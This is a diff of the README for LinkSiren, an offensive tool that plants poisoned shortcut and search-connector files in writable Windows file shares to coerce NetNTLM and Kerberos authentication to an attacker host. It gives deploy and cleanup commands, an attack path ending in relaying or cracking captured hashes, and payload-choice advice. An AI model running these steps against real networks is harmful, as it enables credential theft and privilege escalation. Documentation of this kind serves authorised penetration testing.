@@ -6,18 +6,25 @@
 
 _The Siren waits thee, singing song for song._ - Walter Savage Landor
 
-LinkSiren is your new favorite method for escalation when you're stuck as a non-privileged user with lots of access to file shares. LinkSiren distributes .library-ms, .searchConnector-ms, .url, and .lnk files to optimal locations in accessible file shares to coerce NetNTLM and Kerberos authentication over SMB and HTTP from users that open them and starting the Webclient service on their machines. It's like [Farmer](https://github.com/mdsecactivebreach/Farmer/tree/1f37598125a92c9edf41295c6c1b7c258143968d), [Lnkbomb](https://github.com/dievus/lnkbomb), or [Slinky](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-slinky) but it identifies the best place to put the files for maximum coercion and has scalable deployment and cleanup built in.
+LinkSiren is your new favorite escalation tactic when you're stuck as a non-privileged user with lots of access to file shares. LinkSiren distributes .library-ms, .searchConnector-ms, .url, and .lnk files to optimal locations in accessible file shares to coerce NetNTLM and Kerberos authentication over SMB and HTTP from users that open them and starting the Webclient service on their machines. It's like [Farmer](https://github.com/mdsecactivebreach/Farmer/tree/1f37598125a92c9edf41295c6c1b7c258143968d), [Lnkbomb](https://github.com/dievus/lnkbomb), or [Slinky](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-slinky) but it identifies the best place to put the files for maximum coercion, has scalable deployment and cleanup built in, and generates detailed logs useful for client engagements.
 
 # Installation
 Using pipx (Recommended)
 ```
 # Install linksiren
-pipx install linksiren
+pipx install git+https://github.com/gjhami/LinkSiren.git
 ```
 
 <details>
-<summary>Alternatively, install from source</summary>
+<summary>Alternatively, install from PyPi or source</summary>
 
+Using PyPi
+```
+# Install from PyPi using pipx
+pipx install linksiren
+```
+
+From Source
 ```
 # Download source code
 git clone https://github.com/gjhami/LinkSiren.git
@@ -34,7 +41,7 @@ python -m pip install -r requirements.txt
 
 </details>
 
-# How do I use this NOW?
+# Typical Usage
 ```bash
 # Identify optimal locations for poisoned file deployment
 linksiren identify --targets <shares file> [domain]/username[:password]
@@ -48,7 +55,7 @@ linksiren deploy --attacker <attacker IP> [domain]/username[:password]
 linksiren cleanup [domain]/username[:password]
 ```
 
-# How do I use this the \~right\~ way?
+# Detailed Usage
 1. Create a targets file for crawling containing accessible hosts, shares, or folders on each line in the following format. If a host is specified, shares will be identified on the host and treated as the next level of depth for crawling:
 ```
 \\server1.domain.tld\
@@ -84,7 +91,7 @@ linksiren cleanup [domain]/username[:password]
 
 6. Scan for the WebClient service, now likely started on several machines, see [theHackerRecipes](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient#recon) for details. See this BHIS presentation [Attack Tactics: Shadow Creds for Privesc](https://www.linkedin.com/posts/black-hills-information-security_attack-tactic-shadow-creds-activity-7284615209929891840-Po8m) for how HTTP authentication coerced from the service can be used privesc and lateral movement. Additionally see my blog post [Files that Coerce](https://alittleinsecure.com/files-that-coerce-search-connectors-and-beyond/) for details of how a machine, once taken over using shadow credentials, can be used to coerce authentication from logged in users.
 
-# What is the Attack Path Associated With This Tool?
+# Attack Paths Assocaited with LinkSiren
 1. (Optional) Get Intranet-Zoned if you want to coerce HTTP authentication. See the note in [theHackerRecipes WebClient Abuse](https://www.thehacker.recipes/a-d/movement/mitm-and-coerced-authentications/webclient#abuse) and my blog post [DNS Hijacking: Say My Name](https://alittleinsecure.com/dns-hijacking-say-my-name/).
 2. Create a list of UNC paths to writeable SMB shares.
     - Note: Consider write and delete privileges are distinct on Windows. It is possible you can create a poisoned file but will not have permissions to delete it. If this happens, LinkSiren will be very verbose in letting you know.
@@ -96,10 +103,10 @@ linksiren cleanup [domain]/username[:password]
 8. Let the hashes roll in. Relay and/or crack as desired.
 9. Run LinkSiren in `cleanup` mode to delete all the poisoned files.
 
-# Modes
+# Usage Modes
 LinkSiren offers the following modes of operation:
 
-## Generate
+### Generate
 Create poisoned files to use for coercion and store them locally.
 
 <details>
@@ -108,6 +115,8 @@ Create poisoned files to use for coercion and store them locally.
 ```
 linksiren generate --help
 usage: linksiren generate [-h] -a ATTACKER [-n PAYLOAD]
+
+Output specified payload file to the current directory instead of a remote location.
 
 options:
   -h, --help            show this help message and exit
@@ -120,8 +129,8 @@ Required Arguments:
 ```
 </details>
 
-## Rank
-Given a list of accessible shares, output ranks for the folders within them based on the liklihood placing a file in the folder will coerce authentication from a user.
+### Rank
+Given a list of accessible shares or hosts, output ranks for the folders within them based on the liklihood placing a file in the folder will coerce authentication from a user.
 
 <details>
 <summary>Usage</summary>
@@ -129,6 +138,8 @@ Given a list of accessible shares, output ranks for the folders within them base
 ```
 linksiren rank --help
 usage: linksiren rank [-h] -t TARGETS [-md MAX_DEPTH] [-at ACTIVE_THRESHOLD] [-f] [-is IGNORE_SHARES [IGNORE_SHARES ...]] [-mc MAX_CONCURRENCY] credentials
+
+Output identified subfolders and rankings to folder_rankings.txt
 
 options:
   -h, --help            show this help message and exit
@@ -140,29 +151,27 @@ options:
   -is IGNORE_SHARES [IGNORE_SHARES ...], --ignore-shares IGNORE_SHARES [IGNORE_SHARES ...]
                         (Default: 'C$' 'ADMIN$' 'SYSVOL') Do not review the contents of specified shares when crawling as part of the folder ranking process.
   -mc MAX_CONCURRENCY, --max-concurrency MAX_CONCURRENCY
-                        (Default: 4) Max number of concurrent processes to use for crawling in rank and identification modes. Note: a maximum of 1 process is used per host.
-                        So linksiren will never make multiple simultaneous connections to the same host and concurrent processing will not accelerate crawling multiple
-                        shares on a single host.
+                        (Default: 4) Max number of concurrent processes to use for crawling in rank and identification modes. Note: a maximum of 1 process is used per host. So linksiren will never make multiple simultaneous connections to the same host and concurrent processing will not
+                        accelerate crawling multiple shares on a single host.
 
 Required Arguments:
   credentials           [domain/]username[:password] for authentication
   -t TARGETS, --targets TARGETS
-                        Path to a text file containing UNC paths to file shares / base directories within which to rank folders as potential locations for placing poisoned
-                        files.
+                        Path to a text file containing UNC paths to file shares / base directories within which to rank folders as potential locations for placing poisoned files.
 ```
 </details>
 
-## Identify
-Given a list of accessible shares and customizable constraints, including a maximum number of target folders per share, output UNC paths to the optimal folders for placing poisoned files.
+### Identify
+Given a list of accessible shares or hosts and customizable constraints, including a maximum number of target folders per share, output UNC paths to the optimal folders for placing poisoned files.
 
 <details>
 <summary>Usage</summary>
 
 ```
 linksiren identify --help
-usage: linksiren identify [-h] -t TARGETS [-md MAX_DEPTH] [-at ACTIVE_THRESHOLD] [-f] [-is IGNORE_SHARES [IGNORE_SHARES ...]] [-mf MAX_FOLDERS_PER_TARGET]
-                          [-mc MAX_CONCURRENCY]
-                          credentials
+usage: linksiren identify [-h] -t TARGETS [-md MAX_DEPTH] [-at ACTIVE_THRESHOLD] [-f] [-is IGNORE_SHARES [IGNORE_SHARES ...]] [-mf MAX_FOLDERS_PER_TARGET] [-mc MAX_CONCURRENCY] credentials
+
+Identify target folders for payload distribution and output to payload_targets.txt
 
 options:
   -h, --help            show this help message and exit
@@ -172,14 +181,12 @@ options:
                         (Default: 2) Max number of days since within which a file is considered active.
   -f, --fast            (Default: False) Mark folders active as soon as one active file in them is identified and move on. Ranks are all set to 1.
   -is IGNORE_SHARES [IGNORE_SHARES ...], --ignore-shares IGNORE_SHARES [IGNORE_SHARES ...]
-                        (Default: 'C$' 'ADMIN$' 'SYSVOL') Do not review the contents of specified shares when crawling as part of the folder ranking and optimal poisoning
-                        folder identification process.
+                        (Default: 'C$' 'ADMIN$' 'SYSVOL') Do not review the contents of specified shares when crawling as part of the folder ranking and optimal poisoning folder identification process.
   -mf MAX_FOLDERS_PER_TARGET, --max-folders-per-target MAX_FOLDERS_PER_TARGET
                         (Default: 10) Maximum number of folders to output as deployment targets per supplied target share or folder.
   -mc MAX_CONCURRENCY, --max-concurrency MAX_CONCURRENCY
-                        (Default: 4) Max number of concurrent processes to use for crawling in rank and identification modes. Note: a maximum of 1 process is used per host.
-                        So linksiren will never make multiple simultaneous connections to the same host and concurrent processing will not accelerate crawling multiple
-                        shares on a single host.
+                        (Default: 4) Max number of concurrent processes to use for crawling in rank and identification modes. Note: a maximum of 1 process is used per host. So linksiren will never make multiple simultaneous connections to the same host and concurrent processing will not
+                        accelerate crawling multiple shares on a single host.
 
 Required Arguments:
   credentials           [domain/]username[:password] for authentication
@@ -189,7 +196,7 @@ Required Arguments:
 
 </details>
 
-## Deploy
+### Deploy
 Generate poisoned files for coercion and deploy them to specified UNC paths. Typically the specified UNC paths are the output of `identify` mode. Output a list of UNC paths to folders where payloads were successfully deployed for cleanup.
 
 <details>
@@ -198,6 +205,8 @@ Generate poisoned files for coercion and deploy them to specified UNC paths. Typ
 ```
 linksiren deploy --help
 usage: linksiren deploy [-h] -a ATTACKER [-t TARGETS] [-n PAYLOAD] credentials
+
+Deploy payloads to all folder UNC paths listed one per line in the file specified using --targets
 
 options:
   -h, --help            show this help message and exit
@@ -213,7 +222,7 @@ Required Arguments:
 ```
 </details>
 
-## Cleanup
+### Cleanup
 Remove all payloads from the specified UNC paths, typically the output of `deploy` mode.
 
 <details>
@@ -222,6 +231,8 @@ Remove all payloads from the specified UNC paths, typically the output of `deplo
 ```
 linksiren cleanup --help
 usage: linksiren cleanup [-h] [-t TARGETS] credentials
+
+Delete poisoned files from folder UNC paths specified in --targets
 
 options:
   -h, --help            show this help message and exit
@@ -234,6 +245,7 @@ Required Arguments:
 
 </details>
 
+# Other Information
 ## What Payload Type Should I Use?
 Search Connectors (.searchConnector-ms): This is generally the best option. They require the least amount of interaction, start the WebClient service from a stopped state automatically when the parent folder is opened in Explorer, and are capable of coercing both SMB and HTTP authentication using a single file.
 
@@ -252,16 +264,17 @@ LinkSiren crawls accessible shares and ranks every subfolder based on the liklih
 
 ## How will you make it even better?
 I'm looking to add the following features:
+- [ ] Add safety features:
+    - [ ] Check if a file exists before overwriting it with a payload in deploy mode.
+    - [ ] Check if files can be deleted from a target path before creating a payload there.
+- [ ] Add the ability to deploy files encrypted with EFS to trigger the start of the Encrypting File Service on Windows 11 machines so authentication can subsequently be coreced using tools like [Coercer](https://github.com/p0dalirius/Coercer) and [PetitPotam](https://github.com/topotam/PetitPotam).
 - [ ] Repackage for use with UV.
-- [ ] Add a safe mode that checks if a file can be deleted from a target share before deploying it.
 - [ ] Add an option for 'invisible' targets for .Library-ms and .searchConnector-ms files where the icon is set to blank and the name is set to a non-printing, valid ASCII character.
-- [ ] Test for anonymous access to shares
-- [ ] Add an explanation of how this can be used with ntlmrelayx (Blog Post In Progress)
-- [ ] Enable authentication using a NTLM hash
-- [ ] Enable ticket based authnentication (Kerberos)
+- [ ] Test for anonymous access to shares.
+- [ ] Enable authentication using a NTLM hash.
+- [ ] Enable ticket based authnentication (Kerberos).
 - [ ] Add pydantic validation for arguments including targets and output file names.
-- [ ] Add compatibility with proxied SMB relay connections created using impacket's ntlmrelayx.
-    - The attack would need to be added to [smbattack.py](https://github.com/fortra/impacket/blob/4a62f391cf2c5e60577e0138b01df4fec735d5ed/impacket/examples/ntlmrelayx/attacks/smbattack.py#L57) and would need to accept only an authenticated SMB connection.
+- [ ] Test the tool through a socks proxy connection to an smb share generated using ntlmrelayx.
 
-## Note
+## Disclaimer
 This tools is designed for ethical hacking and penetration testing. It should be used exclusively on networks where explicit, written permission has been granted for testing. I accept no responsibility for the safety or effectiveness of this tool. Please don't sue me.
